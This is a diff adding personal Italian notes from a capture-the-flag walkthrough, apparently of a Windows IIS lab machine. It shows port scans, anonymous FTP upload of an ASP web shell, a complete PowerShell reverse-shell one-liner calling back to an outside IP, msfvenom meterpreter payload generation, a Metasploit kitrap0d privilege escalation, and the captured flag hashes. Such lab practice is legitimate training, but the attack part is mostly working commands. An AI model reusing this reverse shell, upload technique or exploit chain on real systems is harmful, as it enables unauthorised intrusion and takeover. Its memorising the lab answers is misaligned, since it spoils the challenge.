@@ -1,0 +1,116 @@
+10.10.10.5
+
+sudo masscan -p1-65535 --rate 1000 --banners --open -e tun0 10.10.10.5                                                                                                                                                                1 ⨯
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-19 10:35:43 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.5                                      
+Discovered open port 21/tcp on 10.10.10.5
+
+nmap -sC -sV -p21,80 10.10.10.5
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       <DIR>          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+si riesce ad accedere come anonymous al servizio ftp:
+
+ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:daerves): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+
+(ho dato come pwd devel ma potevo anche non metterla)
+
+sul sito c'è solo la apgina base di Microsoft IIS 7 (conoscendo anche la evrsione si può vedere se si riesce  a trovare un explopit)
+
+avendoa ccesso a ftp ho trovato una directory:
+
+/aspnet_client/system_web/2_0_50727
+
+e andandoci da web mi da 403 forbidden e non 404 quindi appartiene alla struttura del sito, potrebbe essere che non mi fa accedere alla directory ma mi fa accedere ai file all'interno
+per verificare provo a caricarci un file tramite ftp e vedere se lo visualizzo
+
+non reisco a caricarlo nelle sottodirectory (permission denied ma riesco a caricarlo direttamente in /)
+
+http://10.10.10.5/prova.txt         //riesco a visualizzarlo
+
+posso provare quindi a caricare una web-shell in asp
+
+http://10.10.10.5/webshell.asp
+
+\\DEVEL\IUSR10.10.10.5
+
+
+The server's port:
+80
+
+
+The server's software:
+Microsoft-IIS/7.5
+
+
+The server's local address:
+10.10.10.5
+
+
+    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.3',4433);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+ottengo rev shell:
+
+PS C:\windows\system32\inetsrv> whoami
+iis apppool\web
+
+
+net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            babis                    Guest 
+
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=443 -f aspx > met_rev_443.aspx
+carico coon ftp 
+msfconsole
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 4433
+exploit
+background
+
+
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 75
+SESSION => 75
+msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST tun0
+LHOST => tun0
+msf6 exploit(windows/local/ms10_015_kitrap0d) > exploit
+
+c:\Users\babis\Desktop>type user.txt.txt
+type user.txt.txt
+9ecdd6a3aedf24b41562fea70f4cb3e8
+
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+e621a0b5041708797c4fc4728bc72b4b
+
+
+
+
+
